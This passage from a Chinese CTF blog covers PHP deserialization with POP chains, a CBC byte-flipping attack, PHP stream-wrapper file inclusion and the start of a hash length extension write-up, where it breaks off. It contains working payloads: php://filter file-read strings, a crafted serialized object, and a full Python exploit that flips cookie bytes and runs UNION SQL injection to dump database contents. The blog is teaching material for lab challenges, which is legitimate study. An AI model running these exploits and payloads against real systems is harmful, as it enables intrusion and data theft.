-</code></pre></blockquote>
-</li>
-<li>double<blockquote>
-<pre><code>d:;
-d:1.2345600000000001; // 1.23456（php弱类型所造成的四舍五入现象）
-</code></pre></blockquote>
-</li>
-<li>null<blockquote>
-<pre><code>N; //NULL
-</code></pre></blockquote>
-</li>
-<li>string<blockquote>
-<pre><code>s::&quot;&quot;;
-s&quot;INSOMNIA&quot;; // &quot;INSOMNIA&quot;
-</code></pre></blockquote>
-</li>
-<li>array<blockquote>
-<pre><code>a::{key, value pairs};
-a{s&quot;key1&quot;;s&quot;value1&quot;;s&quot;value2&quot;;} // array(&quot;key1&quot; =&quot;value1&quot;, &quot;key2&quot; =&quot;value2&quot;)
-</code></pre></blockquote>
-</li>
-</ul>
-<ol>
-<li>应用举例</li>
-</ol>
-<p>给出一个demo1.php</p>
-<pre><code>&lt;?php
-class test{
-    var $varible = &quot;hello world&quot;;
-
-    function printit(){
-        echo $this-&gt;varible;
-    }
-}
-
-$demo = new test();
-#$demo-&gt;printit();
-echo serialize($demo);
-?&gt;
-</code></pre><p>得到结果：<br><img src="https://i.imgur.com/ag0Phwi.png" alt=""><br>进行分析：<br><img src="https://i.imgur.com/1RQuSlW.png" alt=""></p>
-<p>这里涉及到一个基本概念</p>
-<blockquote>
-<p>类成员包括由属性和方法构成，类属性存在于数据段，类方法存在于代码段，对于一个类来说，类的方法不占用类的空间，占空间的只有类的属性</p>
-</blockquote>
-<p>还需要注意的是：<br>当成员变量为<strong>private</strong>时</p>
-<pre><code>private $flag = &quot;hello world&quot;;
-</code></pre><p>此时会出现</p>
-<pre><code>s:10:&quot;testflag&quot;;
-</code></pre><p>用winhex查看源文件，发现<br><img src="https://i.imgur.com/6aYp8Dp.png" alt=""></p>
-<p>当成员变量为<strong>protected</strong>时</p>
-<pre><code>protected $flag = &quot;hello world&quot;;
-</code></pre><p>此时会出现</p>
-<pre><code>s:7:&quot;*flag&quot;;
-</code></pre><p>用winhex查看源文件会发现：<br><img src="https://i.imgur.com/KpIkZ6K.png" alt=""></p>
-<p>原因是什么呢<br>是因为</p>
-<blockquote>
-<p>对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上’*’。这些前缀值在任一侧都有空字节。</p>
-</blockquote>
-<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><strong>construct(), destruct()</strong></p>
-<p>构造函数与析构函数</p>
-<p><strong>call(), callStatic()</strong></p>
-<p>方法重载的两个函数</p>
-<p>__call()是在对象上下文中调用不可访问的方法时触发</p>
-<p>__callStatic()是在静态上下文中调用不可访问的方法时触发。</p>
-<p><strong>get(), set()</strong></p>
-<p>__get()用于从不可访问的属性读取数据。</p>
-<p>__set()用于将数据写入不可访问的属性。</p>
-<p><strong>isset(), unset()</strong></p>
-<p>__isset()在不可访问的属性上调用isset()或empty()触发。</p>
-<p>__unset()在不可访问的属性上使用unset()时触发。</p>
-<p><strong>sleep(), wakeup()</strong></p>
-<p>serialize()检查您的类是否具有魔术名sleep()的函数。如果是这样，该函数在任何序列化之前执行。它可以清理对象，并且应该返回一个数组，其中应该被序列化的对象的所有变量的名称。如果该方法不返回任何内容，则将NULL序列化并发出E_NOTICE。sleep()的预期用途是提交挂起的数据或执行类似的清理任务。此外，如果您有非常大的对象，不需要完全保存，该功能将非常有用。</p>
-<p>unserialize()使用魔术名wakeup()检查函数的存在。如果存在，该功能可以重构对象可能具有的任何资源。wakeup()的预期用途是重新建立在序列化期间可能已丢失的任何数据库连接，并执行其他重新初始化任务。</p>
-<p><strong>__toString()</strong></p>
-<p>__toString（）方法允许一个类决定如何处理像一个字符串时它将如何反应。</p>
-<p><strong>__invoke()</strong></p>
-<p>当脚本尝试将对象调用为函数时，调用__invoke()方法。</p>
-<p><strong>__set_state()</strong></p>
-<p><strong>__clone()</strong></p>
-<p><strong>__debugInfo()</strong></p>
-<p>这里要提一个优先级的问题：</p>
-<p><strong> <strong>wakeup&gt;</strong>toString&gt;__destruct</strong></p>
-<h2 id="反序列化及其问题"><a href="#反序列化及其问题" class="headerlink" title="反序列化及其问题"></a>反序列化及其问题</h2><blockquote>
-<p>反序列化的数据本质上来说是没有危害的</p>
-<p>用户可控数据进行反序列化是存在危害的</p>
-</blockquote>
-<p>所以漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码或变量用户可控，就可能产生反序列化漏洞，根据反序列化后不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p>
-<h3 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h3><blockquote>
-<p>POP:面向属性编程<br>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p>
-<p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。</p>
-</blockquote>
-<p>给出一个关于<a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="noopener">popchain</a>的讲解</p>
-<h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>一些对我们来说有用的POP链方法：</p>
-<p>命令执行：</p>
-<blockquote>
-<p>exec()<br>passthru()<br>popen()<br>system()</p>
-</blockquote>
-<p>文件操作：</p>
-<blockquote>
-<p>file_put_contents()<br>file_get_contents()<br>unlink()</p>
-</blockquote>
-<p><strong>demo1.php</strong></p>
-<pre><code>&lt;?php
-class test{
-    protected $flag = &quot;hello world&quot;;
-
-    function printit(){
-        echo $this-&gt;flag;
-    }
-}
-
-$demo = new test();
-#$demo-&gt;printit();
-echo serialize($demo);
-?&gt;
-</code></pre><p><strong>demo2.php</strong></p>
-<pre><code>&lt;?php
-require(&apos;./demo1.php&apos;);
-
-$object = new test();
-$data = serialize($object);
-#$object-&gt;printit();
-file_put_contents(&apos;get1.txt&apos;,$data);
-
-?&gt;
-</code></pre><p>这里即完成一个存储序列化数据的操作</p>
-<p><strong>demo3.php</strong></p>
-<pre><code>&lt;?php
-require(&apos;./demo1.php&apos;);
-$filename = file_get_contents(&apos;./get1.txt&apos;);
-$object = unserialize($filename);
-var_dump ($object);
-?&gt;
-</code></pre><p>成功解序列化：</p>
-<pre><code>O:4:&quot;test&quot;:1:{s:4:&quot;flag&quot;;s:11:&quot;hello world&quot;;}object(test)#2 (1) { [&quot;flag&quot;]=&gt; string(11) &quot;hello world&quot; }
-</code></pre><p>由于对于<strong>get1.txt</strong>没有进行任何处理，此时若我将<strong>”hello world“</strong>改为<strong>“i got it”</strong>，则会显示：</p>
-<pre><code>O:4:&quot;test&quot;:1:{s:4:&quot;flag&quot;;s:11:&quot;hello world&quot;;}object(test)#2 (1) { [&quot;flag&quot;]=&gt; string(8) &quot;i got it&quot; }
-</code></pre><p>成功更改了值</p>
-<h3 id="一道CTF的题"><a href="#一道CTF的题" class="headerlink" title="一道CTF的题"></a>一道CTF的题</h3><p>题目名字叫<a href="http://120.24.86.145:8006/test1/" target="_blank" rel="noopener">welcome to bugkuctf</a></p>
-<p>打开题目，点击源码查看，得到：</p>
-<pre><code>&lt;!--  
-$user = $_GET[&quot;txt&quot;];  
-$file = $_GET[&quot;file&quot;];  
-$pass = $_GET[&quot;password&quot;];  
-
-if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){  
-echo &quot;hello admin!&lt;br&gt;&quot;;  
-include($file); //hint.php  
-}else{  
-echo &quot;you are not admin ! &quot;;  
-}  
- --&gt;
-</code></pre><p>不难理解，定义了三个get方法传入的参数，根据条件，构造</p>
-<pre><code>?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php
-</code></pre><p>post提交<strong>welcome to the bugkuctf</strong><br>得到了hint.php的源码：</p>
-<pre><code> &lt;?php  
-
-class Flag{//flag.php  
-public $file;  
-public function __tostring(){  
-if(isset($this-&gt;file)){  
-echo file_get_contents($this-&gt;file); 
-            echo &quot;&lt;br&gt;&quot;;
-        return (&quot;good&quot;);
-}  
-}  
-}  
-?&gt;
-</code></pre><p>但是发现不足以解出题目，于是便查看index.php<br> <code>txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
-<p>得到：</p>
-<pre><code>&lt;?php  
-$txt = $_GET[&quot;txt&quot;];  
-$file = $_GET[&quot;file&quot;];  
-$password = $_GET[&quot;password&quot;];  
-
-if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){  
-echo &quot;hello friend!&lt;br&gt;&quot;;  
-if(preg_match(&quot;/flag/&quot;,$file)){ 
-        echo &quot;不能现在就给你flag哦&quot;;
-exit();  
-}else{  
-include($file);   
-$password = unserialize($password);  
-echo $password;  
-}  
-}else{  
-echo &quot;you are not the number of bugku ! &quot;;  
-}  
-
-?&gt;
-</code></pre><p>可以知道很重要的一点就是，对<strong>password</strong>进行了反序列化<br>于是根据<strong>Flag类</strong>构造序列化的字符串：</p>
-<pre><code>?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}
-</code></pre><p>最终得到flag</p>
-<p>参考链接：<br><a href="https://www.anquanke.com/post/id/86452" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86452</a><br><a href="http://k1n9.me/2016/11/06/php-obi/" target="_blank" rel="noopener">http://k1n9.me/2016/11/06/php-obi/</a><br><a href="http://www.freebuf.com/column/151447.html" target="_blank" rel="noopener">http://www.freebuf.com/column/151447.html</a></p>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/web/">web</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2018/05/27/vulnerable/cbc/"><span>CBC字节翻转攻击</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/05/27/vulnerable/cbc/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-05-27T06:32:30.580Z">
-          2018-05-27
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <h1 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h1><h3 id="什么是CBC"><a href="#什么是CBC" class="headerlink" title="什么是CBC"></a>什么是CBC</h3><p>相信学过密码学的都知道，cbc属于分组加密中的其中一种模式<br>加密过程如下：<br><img src="https://i.imgur.com/7ZgndUF.png" alt=""></p>
-<blockquote>
-<p><strong>Plaintext</strong>：待加密的数据。</p>
-<p><strong>IV</strong>：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</p>
-<p><strong>Key</strong>：被一些如AES的对称加密算法使用。</p>
-<p><strong>Ciphertext</strong>：加密后的数据。</p>
-</blockquote>
-<p>明文都是先与混淆数据（第一组是与IV，之后都是与前一组的密文）进行异或，再执行分组加密的。</p>
-<p>解密过程：<br><img src="https://i.imgur.com/eNVMytE.jpg" alt=""></p>
-<ul>
-<li>Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块</li>
-</ul>
-<ul>
-<li>Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</li>
-</ul>
-<p>当改变密文分组中的某一块时，则会对该分组的明文及其下一分组的明文的相同偏移量处产生影响：</p>
-<p><img src="https://i.imgur.com/YNx3n38.jpg" alt=""></p>
-<h3 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h3><p><a href="http://drops.xmd5.com/static/drops/tips-7828.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-7828.html</a><br><a href="http://www.freebuf.com/articles/system/163756.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/163756.html</a></p>
-<h3 id="一道ctf的题"><a href="#一道ctf的题" class="headerlink" title="一道ctf的题"></a>一道ctf的题</h3><p>这是实验吧的一道<a href="http://www.shiyanbar.com/ctf/2037" target="_blank" rel="noopener">简单的登陆题</a>，通过查看<strong>test.php</strong>,可以知道如下源代码：</p>
-<pre><code>define(&quot;SECRET_KEY&quot;, &apos;***********&apos;);
-define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);
-error_reporting(0);
-include(&apos;conn.php&apos;);
-function sqliCheck($str){
-    if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str)){
-        return 1;
-    }
-    return 0;
-}
-function get_random_iv(){
-$random_iv=&apos;&apos;;
-for($i=0;$i&lt;16;$i++){
-$random_iv.=chr(rand(1,255));
-}
-return $random_iv;
-}
-function login($info){
-    $iv = get_random_iv();
-    $plain = serialize($info);
-$cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
-setcookie(&quot;iv&quot;, base64_encode($iv));
-setcookie(&quot;cipher&quot;, base64_encode($cipher));
-}
-function show_homepage(){
-    global $link;
-if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;])){
-$cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);
-$iv = base64_decode($_COOKIE[&quot;iv&quot;]);
-if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
-$info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);
-$sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;;
-$result=mysqli_query($link,$sql);
-if(mysqli_num_rows($result)&gt;0  or die(mysqli_error($link))){
-    $rows=mysqli_fetch_array($result);
-                echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&apos;.$rows[&apos;username&apos;].&apos;&lt;/center&gt;&lt;/h1&gt;&apos;;
-            }
-            else{
-                echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;
-            }
-}else{
-die(&quot;ERROR!&quot;);
-}
-}
-}
-if(isset($_POST[&apos;id&apos;])){
-$id = (string)$_POST[&apos;id&apos;];
-if(sqliCheck($id))
-        die(&quot;&lt;h1 style=&apos;color:red&apos;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;);
-$info = array(&apos;id&apos;=&gt;$id);
-login($info);
-echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;
-}else{
-if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;])){
-show_homepage();
-}else{
-echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;
-&lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt;
-&lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;
-&lt;div class=&quot;header&quot;&gt;
-&lt;h1&gt;Login Form&lt;/h1&gt;
-&lt;span&gt;input id to login&lt;/span&gt;
-&lt;/div&gt;
-&lt;div class=&quot;content&quot;&gt;
-&lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;
-&lt;/div&gt;
-&lt;div class=&quot;footer&quot;&gt;
-&lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt;
-&lt;/div&gt;
-&lt;/form&gt;
-&lt;/div&gt;
-&lt;/body&gt;&apos;;
-}
-}
-</code></pre><p>对源码做分析：</p>
-<ol>
-<li>post方式提交id值，并对id进行过滤</li>
-<li>iv和cipher作为cookie，采用cbc方式加密，并且还有base64进行编码，以及序列化操作</li>
-<li>id=1;%00,显示的是Hello!rootzz</li>
-<li>所以从cookie点出发，尝试cbc字节翻转进行注入操作</li>
-</ol>
-<p>给出Pcat的exp：</p>
-<pre><code># -*- coding:utf8 -*-
-# 请保留我的个人信息，谢谢~！
-__author__=&apos;pcat@chamd5.org&apos;
-
-from base64 import *
-import urllib
-import requests
-import re
-
-def mydecode(value):
-return b64decode(urllib.unquote(value))
-
-def myencode(value):
-return urllib.quote(b64encode(value))
-
-def mycbc(value,idx,c1,c2):
-lst=list(value)
-lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))
-return &apos;&apos;.join(lst)
-
-def pcat(payload,idx,c1,c2):
-url=r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php&apos;
-myd={&apos;id&apos;:payload}
-res=requests.post(url,data=myd)
-cookies=res.headers[&apos;Set-Cookie&apos;]
-
-iv=re.findall(r&apos;iv=(.*?),&apos;,cookies)[0]
-cipher=re.findall(r&apos;cipher=(.*)&apos;,cookies)[0]
-
-iv_raw=mydecode(iv)
-cipher_raw=mydecode(cipher)
-
-cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))
-cookies_new={&apos;iv&apos;:iv,&apos;cipher&apos;:cipher_new}
-cont=requests.get(url,cookies=cookies_new).content
-plain=b64decode(re.findall(r&quot;base64_decode\(&apos;(.*?)&apos;\)&quot;,cont)[0])
-
-first=&apos;a:1:{s:2:&quot;id&quot;;s:&apos;
-iv_new=&apos;&apos;
-for i in range(16):
-iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))
-iv_new=myencode(iv_new)
-
-cookies_new={&apos;iv&apos;:iv_new,&apos;cipher&apos;:cipher_new}
-cont=requests.get(url,cookies=cookies_new).content
-print &apos;Payload:%s\n&gt;&gt; &apos; %(payload)
-print cont
-pass
-
-
-def foo():
-pcat(&apos;12&apos;,4,&apos;2&apos;,&apos;#&apos;)
-pcat(&apos;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)
-pcat(&apos;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&apos;+chr(0),7,&apos;2&apos;,&apos;u&apos;)
-pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &apos;you_want&apos;)b join (select 3)c);&quot;+chr(0),7,&apos;2&apos;,&apos;u&apos;)
-pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0),6,&apos;2&apos;,&apos;u&apos;)
-pass
-
-if __name__ == &apos;__main__&apos;:
-foo()
-print &apos;ok&apos;
-</code></pre><p>最后还有一点就是给出openssl_encrypt的用法：</p>
-<pre><code>string openssl_encrypt ( string $data , string $method , string $key [, int $options = 0 [, string $iv = &quot;&quot; [, string &amp;$tag = NULL [, string $aad = &quot;&quot; [, int $tag_length = 16 ]]]]] )
-</code></pre><blockquote>
-<p>data</p>
-<pre><code>待加密的明文信息数据。
-</code></pre><p>method</p>
-<pre><code>密码学方式。openssl_get_cipher_methods() 可获取有效密码方式列表。
-</code></pre><p>key</p>
-<pre><code>key。
-</code></pre><p>options</p>
-<pre><code>options 是以下标记的按位或： OPENSSL_RAW_DATA 、 OPENSSL_ZERO_PADDING。
-</code></pre><p>iv</p>
-<pre><code>非 NULL 的初始化向量。
-</code></pre><p>tag</p>
-<pre><code>使用 AEAD 密码模式（GCM 或 CCM）时传引用的验证标签。
-</code></pre><p>aad</p>
-<pre><code>附加的验证数据。
-</code></pre><p>tag_length</p>
-<pre><code>验证 tag 的长度。GCM 模式时，它的范围是 4 到 16。
-</code></pre></blockquote>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/CTF/">CTF</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2018/05/27/vulnerable/php伪协议/"><span>php伪协议</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/05/27/vulnerable/php伪协议/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-05-26T16:22:14.129Z">
-          2018-05-27
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h3 id="什么是伪协议"><a href="#什么是伪协议" class="headerlink" title="什么是伪协议"></a>什么是伪协议</h3><p>也不知道伪协议这个名字是从什么时候开始出现的，但我第一次接触还是在打ctf的时候，与其说伪协议，倒不如直接了解PHP支持的协议和封装的协议<br>官方文档给出了如下的php所支持的协议：</p>
-<blockquote>
-<p>file:// — 访问本地文件系统<br>http:// — 访问 HTTP(s) 网址<br>ftp:// — 访问 FTP(s) URLs<br>php:// — 访问各个输入/输出流（I/O streams）<br>zlib:// — 压缩流<br>data:// — 数据（RFC 2397）<br>glob:// — 查找匹配的文件路径模式<br>phar:// — PHP 归档<br>ssh2:// — Secure Shell 2<br>rar:// — RAR<br>ogg:// — 音频流<br>expect:// — 处理交互式的流</p>
-</blockquote>
-<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><p>定义：</p>
-<blockquote>
-<p>访问各个输入/输出流（I/O streams）</p>
-</blockquote>
-<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。当enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
-<p><strong>16年华山杯</strong>：</p>
-<p><code>&lt;?php</code><br><code>$user = $_GET[&quot;user&quot;];</code><br><code>$file = $_GET[&quot;file&quot;];</code><br><code>$pass = $_GET[&quot;pass&quot;];</code><br><code>if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;the</code> <code>user is admin&quot;)){</code><br><code>echo &quot;hello admin!&lt;br&gt;&quot;;</code><br><code>include($file); //class.php</code><br><code>}else{</code><br><code>echo &quot;you are not admin ! &quot;;</code><br><code>}</code><br><code>?&gt;</code></p>
-<p>则可以利用php://input:<br><img src="https://i.imgur.com/zbPgDT6.png" alt=""></p>
-<p>除此自外，还可以进行<strong>代码执行</strong>，但是有一个利用条件：<strong>allow_url_include = On</strong>，开启之后可以post如：<strong>&lt;? phpinfo(); ?&gt;</strong>，可以查看网站配置信息</p>
-<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><blockquote>
-<p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
-</blockquote>
-<h4 id="相关参数"><a href="#相关参数" class="headerlink" title="相关参数"></a>相关参数</h4><blockquote>
-<ul>
-<li><strong>resource=&lt;要过滤的数据流&gt;</strong>    这个参数是必须的。它指定了你要筛选过滤的数据流。</li>
-</ul>
-<ul>
-<li><strong>read=&lt;读链的筛选列表&gt;</strong>    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</li>
-</ul>
-<ul>
-<li><strong>write=&lt;写链的筛选列表&gt;</strong>    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</li>
-</ul>
-<ul>
-<li><strong>&lt;；两个链的筛选列表&gt;</strong>    任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</li>
-</ul>
-</blockquote>
-<p>iscc2018中有两道题考察了文件包含漏洞的相关知识，其中就涉及到该协议<br>第一题较为简单，但是考虑到过滤，所以要对<strong>php</strong>进行处理，在<strong>f</strong>后写payload：</p>
-<pre><code>f=PHP://filter/read=convert.base64-encode/resource=index
-</code></pre><p>就可以解出来<br>第二题，直接给出<a href="https://www.anquanke.com/post/id/146063#h3-16" target="_blank" rel="noopener">解题链接</a></p>
-<h4 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h4><blockquote>
-<p>php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
-</blockquote>
-<h4 id="php-fd"><a href="#php-fd" class="headerlink" title="php://fd"></a>php://fd</h4><blockquote>
-<p>php://fd 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 3。</p>
-</blockquote>
-<h4 id="php-memory-和-php-temp"><a href="#php-memory-和-php-temp" class="headerlink" title="php://memory 和 php://temp"></a>php://memory 和 php://temp</h4><blockquote>
-<p>php://memory 和 php://temp 是一个类似文件 包装器的数据流，允许读写临时数据。 两者的唯一区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</p>
-<p>php://temp 的内存限制可通过添加 /maxmemory:NN 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</p>
-</blockquote>
-<p>参考链接：<br><a href="https://www.anquanke.com/post/id/146063#h3-16" target="_blank" rel="noopener">https://www.anquanke.com/post/id/146063#h3-16</a><br><a href="https://mp.weixin.qq.com/s/RaxfIg9x5Rh1qjDgFBr82Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RaxfIg9x5Rh1qjDgFBr82Q</a><br><a href="https://www.jianshu.com/p/237804b9f19b" target="_blank" rel="noopener">https://www.jianshu.com/p/237804b9f19b</a><br><a href="http://www.4o4notfound.org/index.php/archives/31/" target="_blank" rel="noopener">http://www.4o4notfound.org/index.php/archives/31/</a></p>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/CTF/">CTF</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2018/03/15/vulnerable/hash扩展攻击/"><span>hash长度扩展攻击</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/03/15/vulnerable/hash扩展攻击/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-03-15T04:48:36.997Z">
-          2018-03-15
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <h1 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h1><h2 id="实验吧：让我进去"><a href="#实验吧：让我进去" class="headerlink" title="实验吧：让我进去"></a>实验吧：让我进去</h2><h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3><p>用burpsuit抓包，修改cookie中的source值为1，看的php源码：</p>
-<pre><code>`$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;
-$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!
-
-$username = $_POST[&quot;username&quot;];
-$password = $_POST[&quot;password&quot;];
-
-if (!empty($_COOKIE[&quot;getmein&quot;])) {
-if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {
-    if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {
-        echo &quot;Congratulations! You are a registered user.\n&quot;;
-        die (&quot;The flag is &quot;. $flag);
-    }
-    else {
-        die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);
-    }
-}
-else {
-    die (&quot;You are not an admin! LEAVE.&quot;);
-}
-}
-
-setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));
-
-if (empty($_COOKIE[&quot;source&quot;])) {
-setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
-}
-else {
-if ($_COOKIE[&quot;source&quot;] != 0) {
-    echo &quot;&quot;; // This source code is outputted here
-}
-}`
-</code></pre><p>可以得到的信息是：</p>
-<ol>
-<li>secret长度为15</li>
-<li>要在cookie中传入getmein的值</li>
-<li>getmein应等于secret加上username和password的总字符再进行md5加密，username为admin且password不能为admin</li>
-<li>sample-hash=571580b26c65f306376d4f64e53cb5c表示的则是md5($secret . urldecode(“admin” . “admin”)</li>
-</ol>
-<p>这里就涉及到hash长度扩展攻击</p>
-<p>附原理讲解：</p>
-<ul>
-<li><a href="http://www.freebuf.com/articles/web/31756.html" title="原理" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/31756.html</a> </li>
-<li><a href="http://blog.csdn.net/chbsrzf/article/details/49047035" target="_blank" rel="noopener">http://blog.csdn.net/chbsrzf/article/details/49047035</a></li>
-</ul>
-<p>对于这种攻击方式，有一个工具就是hashpump</p>
